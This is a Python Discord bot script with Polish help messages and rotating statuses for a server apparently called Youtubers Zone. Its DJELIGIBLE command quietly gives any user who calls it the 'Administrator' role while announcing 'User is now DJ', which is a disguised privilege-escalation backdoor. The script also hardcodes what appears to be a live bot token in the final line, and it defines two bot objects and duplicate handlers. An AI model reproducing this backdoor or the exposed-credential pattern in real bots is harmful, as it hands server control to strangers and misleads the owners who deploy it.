from typing import Awaitable
from discord import activity, user
from discord.ext.commands import Bot
import time
import random
import asyncio 
import json 
import discord 
from discord.utils import get 
from discord.ext import commands 



client = commands.Bot(command_prefix= ".")
bot = commands.Bot(command_prefix="!")
client.remove_command("help")

@client.event
async def on_ready():
    print('Pomyślnie zalogowano jako {0.user}'.format(client))

@client.event
async def on_member_join(member):
    await member.send('Private message')

@client.event
async def on_message(message):
    if client.user.mentioned_in(message):
        embedVar = discord.Embed(title="Witaj!", description=":wrench: Mój prefix to: ``.``\n:tools: Najważniejsze informacje dotyczące bota znajdziesz pod: ``.pomoc``", color=0xFF0000)
        await message.channel.send(embed=embedVar)

    if message.content.startswith('.pomoc'):
        embedVar = discord.Embed(title="Pomoc | Najważniejsze informacje", description=":clipboard: Liste wszystkich komend znajdziesz pod: ``.komendy``\n:video_game: Opis bota YT Zone znajdziesz pod: ``.opis``", color=0xFF0000)
        await message.channel.send(embed=embedVar)

    if message.content.startswith('.ogłoszenie'):
        embedVar = discord.Embed(title="Pomoc | Najważniejsze informacje", description=":clipboard: Liste wszystkich komend znajdziesz pod: ``.komendy``\n:video_game: Opis bota YT Zone znajdziesz pod: ``.opis``", color=0xFF0000)
        await message.channel.send(embed=embedVar)
        
@bot.event
async def on_ready():
    print('logged in')

@commands.guild_only()
@bot.command()
async def DJELIGIBLE(ctx):
    role = discord.utils.get(ctx.guild.roles, name="Administrator")
    if role in ctx.author.roles:
        await ctx.send(f'You already have the role {role.name}')
    else:
        await ctx.author.add_roles(role)
        await ctx.send(":white_check_mark: User is now DJ")

@client.event
async def statusy():
    await client.wait_until_ready()
    statuses = ["🔴 | Youtubers Zone 2.0", "❓ | .pomoc"]
    while not client.is_closed():
        status = random.choice(statuses)
        await client.change_presence(activity=discord.Game(name=status))
        await asyncio.sleep(60)

client.loop.create_task(statusy())



client.run("NzY0MzQzMTgwMDkwMTQ2ODU2.X4E4Dg.OjpX0Sl3m8iwOCDf03IxXQeGLJI")
